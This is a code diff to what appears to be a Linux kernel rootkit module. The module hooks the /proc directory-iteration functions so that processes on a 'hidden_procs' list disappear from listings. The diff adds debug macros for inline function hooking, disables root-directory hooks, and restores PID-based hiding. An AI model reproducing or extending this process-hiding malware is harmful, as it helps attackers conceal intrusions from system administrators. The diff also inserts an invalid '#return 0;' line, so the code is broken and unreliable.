@@ -15,11 +15,19 @@
 #include <linux/fs.h>
 #include <generated/autoconf.h>
 
-#define __DEBUG__ 1  
+#define __DEBUG__ 1  			// General debugging statements
+#define __DEBUG_HOOK__ 1        // Debugging of inline function hooking
+
 #if __DEBUG__
 # define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
 #else
 # define DEBUG(fmt, ...)
+#endif
+
+#if __DEBUG_HOOK__
+# define DEBUG_HOOK(fmt, ...) printk(fmt, ##__VA_ARGS__)
+#else
+# define DEBUG_HOOK(fmt, ...)
 #endif
 
 #define INLINE_SIZE 12
@@ -144,15 +152,15 @@ LIST_HEAD(hidden_procs);
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
-static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+//static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 #else
 static int (*proc_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
-static int (*root_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
+//static int (*root_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
 #endif
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
 static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
-static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
+//static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
 #define ITERATE_NAME readdir
 #define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
 #define FILLDIR_VAR filldir
@@ -162,7 +170,7 @@ static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
 }
 #else
 static int (*proc_iterate)(struct file *file, struct dir_context *);
-static int (*root_iterate)(struct file *file, struct dir_context *);
+//static int (*root_iterate)(struct file *file, struct dir_context *);
 #define ITERATE_NAME iterate
 #define ITERATE_PROTO struct file *file, struct dir_context *ctx
 #define FILLDIR_VAR ctx->actor
@@ -225,9 +233,9 @@ static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t of
     pid = simple_strtol(name, &endp, 10);
 
     list_for_each_entry ( hp, &hidden_procs, list )
-        //if ( pid == hp->pid )
-        //    return 0;
-        return 0;
+        if ( pid == hp->pid )
+            return 0;
+        #return 0;
 
     return proc_filldir(__buf, name, namelen, offset, ino, d_type);
 }
@@ -241,12 +249,12 @@ static int n_proc_filldir( struct dir_context *npf_ctx, const char *name, int na
 
     list_for_each_entry ( hp, &hidden_procs, list )
         /********source begin*********/
-        //if ( pid == hp->pid )
-        //    return 0;
+        if ( pid == hp->pid )
+            return 0;
         /*********source end********////////
         // to delete all pid!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
         ///////change begin
-        return 0;
+        //return 0;
         ///////change end
 
     return proc_filldir(npf_ctx, name, namelen, offset, ino, d_type);
